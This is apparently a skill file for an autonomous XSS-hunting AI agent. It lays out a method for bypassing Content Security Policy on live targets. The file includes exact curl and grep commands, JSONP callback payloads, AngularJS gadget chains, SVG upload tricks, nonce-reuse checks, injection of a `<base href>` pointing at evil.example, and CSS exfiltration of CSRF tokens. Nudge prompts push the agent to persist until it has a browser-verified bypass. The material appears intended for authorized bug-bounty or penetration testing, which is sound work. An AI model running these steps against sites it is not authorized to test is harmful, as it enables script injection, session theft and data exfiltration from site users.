---
name: csp_bypass_map
agent: agent6_xss
description: Analyze the real CSP for bypasses — unsafe-inline gaps, JSONP endpoints, framework gadgets, upload bypasses.
---

# CSP Bypass Map

## Purpose

A working XSS payload is only half the exploit — Content Security Policy decides whether it fires. Most hunters read the CSP header, see `script-src 'self'`, and give up. That is wrong: `'self'` plus a JSONP endpoint is script execution; `'self'` plus an Angular gadget is script execution; `object-src` missing is Flash-era but `base-uri` missing is clickjacking-adjacent chaos. This skill parses the REAL deployed CSP (not the documented one), scores every directive for known bypass classes, hunts JSONP and gadget endpoints on whitelisted origins, and produces the exact bypass payload that survives the policy. CSP is a puzzle with a finite piece set — this skill tries every piece.

## Division of labor

- **Consumes:** `findings/filter_signature.md` (the minimal payload and whether it's inline-script, event-handler, or URL-scheme based — CSP treats each differently), raw response headers from any probed page (`evidence/` headers files).
- **Produces:** the finished artifact — `findings/csp_bypass_map.md` — the parsed policy, per-directive verdicts, every bypass primitive found (JSONP endpoints, gadgets, upload tricks), and the final CSP-surviving payload per XSS vector. Headers saved under `evidence/csp_bypass_map/`.

## When to use / when NOT to use

- **Use when:** you have a working XSS payload (CONFIRMED or near-confirmed) and need it to actually execute in the victim's browser.
- **Use when:** the CSP header exists on any page that renders attacker input — map it even if you don't have a payload yet, because the bypass primitives (JSONP, gadgets) are findings-adjacent on their own.
- **Use when:** the policy differs per page/route (common: strict CSP on the app, none on the marketing site or error pages) — map every variant.
- **Skip when (time-pass filter):** there is no CSP header at all AND no meta CSP tag — record "no CSP" once and move on (don't audit a policy that doesn't exist). Also skip re-mapping a policy you already fully mapped unless the header changed (diff it first).

## Methodology

1. **Capture the real policy.** Fetch the exact page/route where the XSS fires and save ALL response headers. Also check for `<meta http-equiv="Content-Security-Policy">` tags in the HTML — meta CSPs combine with header CSPs (the strictest wins per directive). Record every policy variant per route.
2. **Parse directive by directive.** Break the policy into directives: `default-src`, `script-src`, `style-src`, `img-src`, `connect-src`, `frame-src`, `object-src`, `base-uri`, `form-action`, `frame-ancestors`, `report-uri`/`report-to`, `upgrade-insecure-requests`. For each: list every source expression. Missing `object-src` falls back to `default-src`; missing directives entirely = no restriction for that resource type.
3. **Score the kill-list.** Check for these immediately-exploitable weaknesses:
   - `'unsafe-inline'` in `script-src` → inline scripts and event handlers execute. Payload works as-is.
   - `'unsafe-eval'` in `script-src` → `eval()`-based gadgets work.
   - `data:` in `script-src` → `data:text/javascript,` payloads execute.
   - `*` or `https:` wildcards in `script-src` → host any JS anywhere.
   - Missing `object-src` with permissive `default-src` → plugin vectors (niche but real).
   - Missing `base-uri` → `<base>` tag injection for relative-URL hijacking.
   - `frame-src`/`child-src` permissive → iframe-based exfiltration UI.
   - `report-uri` pointing at an attacker-influenceable endpoint → policy exfiltration oracle (low value, note it).
4. **Hunt JSONP endpoints on whitelisted origins.** If `script-src` whitelists any host (including `'self'`), enumerate that host's JSONP endpoints: grep the site's JS for `callback=`, `cb=`, `jsonp=` parameters; test known JSONP patterns (`/api/...?callback=alert(1)`). A JSONP endpoint on a whitelisted origin = arbitrary script execution under the policy. This is the #1 real-world CSP bypass.
5. **Hunt framework gadgets.** If the page loads Angular (1.x or 2+), Vue, React, or jQuery from a whitelisted origin, check for CSP-compatible gadget chains: AngularJS `ng-app` + `{{constructor.constructor(...)()}}` (works without `unsafe-eval` in 1.6-), Vue `v-html` template injection, known `strict-dynamic` gadget libraries. Match the framework version to its public gadget chain.
6. **Test file-upload bypasses.** If the app lets users upload files served from `'self'` or a whitelisted origin: upload an HTML/SVG file and check where it's served from. `script-src 'self'` + user HTML hosted on the same origin = full bypass. Even `Content-Disposition: attachment` can be bypassed via `<iframe src>` in some flows — test, don't assume.
7. **Test `strict-dynamic` and nonces.** If the policy uses `'strict-dynamic'` with a nonce: can you leak the nonce? (Nonces in cached pages, nonces reflected in error pages, nonce reuse across requests.) A leaked/reused nonce = inline execution. If nonces are per-request and unguessable, `strict-dynamic` is genuinely strong — document it and pivot.
8. **Test policy scope gaps.** Load: error pages (404/500), the marketing site, legacy subdomains, the mobile API's web views. CSP is often missing or weaker there, and stored XSS frequently renders in those contexts (emails link to the marketing domain, admin panels are legacy apps).
9. **Test `<base>` + `form-action` gaps.** Missing `base-uri`: inject `<base href="https://evil.example/">` to hijack relative script URLs. Weak `form-action`: exfiltrate via form submission to an attacker origin (no JS needed for data theft).
10. **Test CSS-based exfiltration as fallback.** If script execution is truly blocked but `style-src` is loose: CSS attribute-selector exfiltration (`input[value^="a"]{background:url(...)}`) can steal CSRF tokens character by character. Slow, but it turns a "CSP blocked it" into a real finding.
11. **Assemble the final payload.** Combine the XSS vector's minimal payload with the bypass primitive: e.g. reflected param → `<script src="https://<TARGET>/api/jsonp?callback=alert"></script>` (JSONP bypass), or `<base href>` + relative script hijack, or Angular gadget. The final payload must survive BOTH the filter AND the CSP.
12. **Verify in a real browser.** CSP is enforced client-side — curl cannot verify a bypass. Load the final payload in a clean browser profile, confirm execution, and screenshot the console showing no CSP violations blocking it. Also confirm the violation report (if `report-uri` exists) doesn't alert the target in a way that burns the test — use benign payloads.
13. **Decision branches.**
    - If `'unsafe-inline'` present → no bypass needed; verify the original payload fires and document the policy as non-blocking.
    - If JSONP/gadget/upload bypass found → craft the CSP-surviving payload and verify in browser.
    - If the policy is genuinely tight (nonces + strict-dynamic, no JSONP, no uploads) → document as a strong control; the XSS is still a finding (defense-in-depth failure elsewhere, or a future policy regression), marked accordingly.

## Exact commands

Capture the real policy (headers + meta tag):

```bash
mkdir -p evidence/csp_bypass_map
curl -sSI "https://<TARGET>/vulnerable/page" --compressed -o evidence/csp_bypass_map/headers.txt
grep -i 'content-security-policy' evidence/csp_bypass_map/headers.txt
curl -sS "https://<TARGET>/vulnerable/page" --compressed \
  | grep -oiE '<meta[^>]+http-equiv="Content-Security-Policy"[^>]*>' | head -5
```

Diff policies across routes (scope gaps):

```bash
for p in "/" "/app" "/404-test-xyz" "/admin" "/api"; do
  echo "== $p"
  curl -sSI "https://<TARGET>$p" --compressed 2>/dev/null \
    | grep -i 'content-security-policy' | head -2
done > evidence/csp_bypass_map/policy_per_route.txt
cat evidence/csp_bypass_map/policy_per_route.txt
```

JSONP hunt on the site's own JS (whitelisted 'self' origin):

```bash
grep -rhoE '(callback|cb|jsonp|jsoncallback)=[a-zA-Z0-9_]+' evidence/dom_sink_audit/js/ 2>/dev/null | sort -u | head -20
# Then test each candidate endpoint:
curl -sS "https://<TARGET>/api/user?callback=alert123" --compressed | head -c 300; echo
```

Framework/gadget fingerprint (match version to known gadget chains):

```bash
grep -rhoE '(angular[^"]*\.js|vue[^"]*\.js|react[^"]*\.js)' evidence/dom_sink_audit/js/home.html 2>/dev/null | sort -u
curl -sS "https://<TARGET>/" --compressed | grep -oiE 'ng-app|ng-version|data-v-[a-f0-9]+' | sort -u | head
```

Upload-origin bypass test:

```bash
curl -sS -X POST "https://<TARGET>/api/upload" -H "Cookie: session=<YOUR_SESSION>" \
  -F 'file=@/tmp/poc.svg;type=image/svg+xml' -o evidence/csp_bypass_map/upload.json
cat evidence/csp_bypass_map/upload.json
# If it returns a same-origin URL, load it in a browser with <svg onload=alert(1)> content.
```

Nonce reuse test (fetch the page twice, compare nonces):

```bash
n1=$(curl -sS "https://<TARGET>/app" --compressed | grep -oE "nonce-[a-zA-Z0-9+/=]+" | head -1)
n2=$(curl -sS "https://<TARGET>/app" --compressed | grep -oE "nonce-[a-zA-Z0-9+/=]+" | head -1)
echo "nonce1=$n1"; echo "nonce2=$n2"; [ "$n1" = "$n2" ] && echo "NONCE REUSED — bypassable"
```

Final CSP-surviving payload verification (browser-only; example for JSONP bypass):

```html
<!-- reflected into HTML body, CSP: script-src 'self' -->
<script src="https://<TARGET>/api/user?callback=alert(document.domain)"></script>
```

```bash
# Confirm no other policy blocks it: load the URL in a clean browser profile,
# open devtools console, verify execution AND zero CSP violation errors. Screenshot both.
```

## Completion-bias defenses

- [ ] Real policy captured from the exact vulnerable route (headers saved)
- [ ] Meta CSP tags checked and combined policy understood
- [ ] Policy diffed across at least 5 routes (/, /app, 404, /admin, /api)
- [ ] Every directive parsed with per-directive source list
- [ ] Kill-list scored: unsafe-inline, unsafe-eval, data:, wildcards, missing object-src/base-uri
- [ ] JSONP endpoints hunted on every whitelisted origin (grep + live tests)
- [ ] Framework gadgets checked against the exact framework version present
- [ ] File-upload same-origin bypass tested
- [ ] Nonce/strict-dynamic strength tested (reuse check)
- [ ] Policy scope gaps tested (error pages, legacy routes, subdomains)
- [ ] Final CSP-surviving payload assembled (filter + CSP combined)
- [ ] Verified in a real clean-profile browser with console screenshot
- [ ] `findings/csp_bypass_map.md` exists with parsed policy + bypass + final payload
- [ ] **Review step:** agent10_review must verify: (a) the policy was captured from the vulnerable route, not just the homepage, (b) every claimed bypass primitive (JSONP/gadget/upload) has a live test on disk, (c) the final payload was verified in a real browser (curl output doesn't count for CSP), (d) no bypass was claimed from documentation alone.
- [ ] **Nudge prompts:**
  - "Keep going until you have tested every whitelisted origin for JSONP — 'self' with one JSONP endpoint is game over for the policy."
  - "Do not report done before findings/csp_bypass_map.md contains a browser-verified final payload."
  - "A CSP you only read is a CSP you haven't tested. Verify the bypass in a real browser."
- [ ] **Finished artifact definition:** `findings/csp_bypass_map.md` — parsed policy per route, per-directive verdicts, every tested bypass primitive with evidence, and the final CSP-surviving payload with browser verification screenshot path. Existence + verified payload IS done.

## Evidence standard

- Baseline: the vulnerable page's headers before and after (policy didn't change mid-test); a control payload blocked by CSP (proves the policy is actually enforced).
- Reproduction: final payload executed 2x in clean browser profiles.
- Raw evidence: saved headers per route, JSONP test responses, upload responses, browser console screenshots.
- Verdicts: CONFIRMED (payload executes under the real policy, 2x, screenshot) / INCONCLUSIVE (bypass primitive found but execution not yet browser-verified) / NEGATIVE (policy genuinely blocks all primitives tested — documented with the parsed policy).

## Handoffs

- `filter_behavior_analysis`: the final payload must satisfy both the filter alphabet and the CSP — if the CSP forces a payload shape the filter blocks, both skills iterate together.
- `stored_xss_chain`: admin-panel render paths often have different (weaker) CSPs — re-map per render path.
- `file_upload_xss`: owns the upload mechanics; this skill owns the policy analysis of where uploads are served.
- agent10_review: consumes `findings/csp_bypass_map.md` plus browser screenshots.
